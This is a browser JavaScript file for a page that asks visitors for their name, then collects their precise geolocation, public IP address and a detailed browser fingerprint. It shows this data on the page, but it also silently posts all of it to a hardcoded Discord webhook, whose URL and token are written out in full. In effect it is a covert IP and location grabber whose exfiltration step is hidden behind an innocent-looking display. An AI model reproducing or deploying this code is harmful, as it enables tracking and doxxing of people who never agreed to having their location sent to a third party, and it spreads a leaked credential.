// Function to show the modal for entering username
function showModal() {
    $('#usernameModal').modal('show');
}

// Event listener for the button to get IP and location
document.getElementById('getIpAndLocationBtn').addEventListener('click', function() {
    showModal(); // Show modal to get username
});

// Event listener for the button to save username
document.getElementById('saveUsernameBtn').addEventListener('click', function() {
    const username = document.getElementById('usernameInput').value;
    if (username.trim() === '') {
        alert('Please enter your name.');
        return;
    }

    // Close modal after saving username
    $('#usernameModal').modal('hide');

    const options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude.toFixed(6);
            const longitude = position.coords.longitude.toFixed(6);

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;

                    // Device information
                    const deviceInfo = {
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        cookiesEnabled: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        colorDepth: window.screen.colorDepth,
                        deviceMemory: navigator.deviceMemory || 'N/A',
                        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                        batteryLevel: navigator.getBattery ? 'Supported' : 'Not Supported',
                        plugins: getPlugins()
                    };

                    // Function to retrieve plugins information
                    function getPlugins() {
                        const plugins = [];
                        for (let i = 0; i < navigator.plugins.length; i++) {
                            plugins.push({
                                name: navigator.plugins[i].name,
                                description: navigator.plugins[i].description
                            });
                        }
                        return plugins;
                    }

                    // Display information in the table
                    document.getElementById('ipAddress').textContent = ipAddress;
                    document.getElementById('location').textContent = `${latitude}, ${longitude}`;
                    document.getElementById('username').textContent = username;
                    document.getElementById('platform').textContent = deviceInfo.platform;
                    document.getElementById('userAgent').textContent = deviceInfo.userAgent;
                    document.getElementById('language').textContent = deviceInfo.language;
                    document.getElementById('cookiesEnabled').textContent = deviceInfo.cookiesEnabled;
                    document.getElementById('screenWidth').textContent = deviceInfo.screenWidth;
                    document.getElementById('screenHeight').textContent = deviceInfo.screenHeight;
                    document.getElementById('colorDepth').textContent = deviceInfo.colorDepth;
                    document.getElementById('deviceMemory').textContent = deviceInfo.deviceMemory;
                    document.getElementById('hardwareConcurrency').textContent = deviceInfo.hardwareConcurrency;
                    document.getElementById('batteryLevel').textContent = deviceInfo.batteryLevel;
                    document.getElementById('plugins').innerHTML = deviceInfo.plugins.map(plugin =>
                        `<li>${plugin.name} - ${plugin.description}</li>`
                    ).join('');

                    // Sending data to Discord webhook
                    const webhookUrl = 'https://discord.com/api/webhooks/1263106837532901518/3cezamhuVGtK3hQTYC8l1MAgeetYrNl08wfddJrKW6JGrYGuaWiJ7s6xKXuoghUHOx6O';
                    const payload = {
                        content: `\`\`\`=======================================================
--> Username: ${username}\n
--> IPv4 Address: ${ipAddress}\n
--> Location: ${latitude}, ${longitude}\n
--> Device Info:\n
   - Platform: ${deviceInfo.platform}\n
   - User Agent: ${deviceInfo.userAgent}\n
   - Language: ${deviceInfo.language}\n
   - Cookies Enabled: ${deviceInfo.cookiesEnabled}\n
   - Screen Width: ${deviceInfo.screenWidth}\n
   - Screen Height: ${deviceInfo.screenHeight}\n
   - Color Depth: ${deviceInfo.colorDepth}\n
   - Device Memory: ${deviceInfo.deviceMemory}\n
   - Hardware Concurrency: ${deviceInfo.hardwareConcurrency}\n
   - Battery Level: ${deviceInfo.batteryLevel}\n
--> Plugins:
    ${deviceInfo.plugins.map(plugin => `
    - ${plugin.name} - ${plugin.description}
    `).join('')}
=======================================================\`\`\``
                    };

                    // Send payload to Discord webhook
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Successfully sent to Discord');
                        } else {
                            console.error('Error sending to Discord');
                        }
                    })
                    .catch(error => console.error('Error:', error));
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                    alert('Error fetching IP address');
                });
        }, function(error) {
            console.error('Error getting geolocation:', error);
            alert('Error getting geolocation');
        }, options);
    } else {
        alert('Geolocation is not supported by this browser.');
    }
});
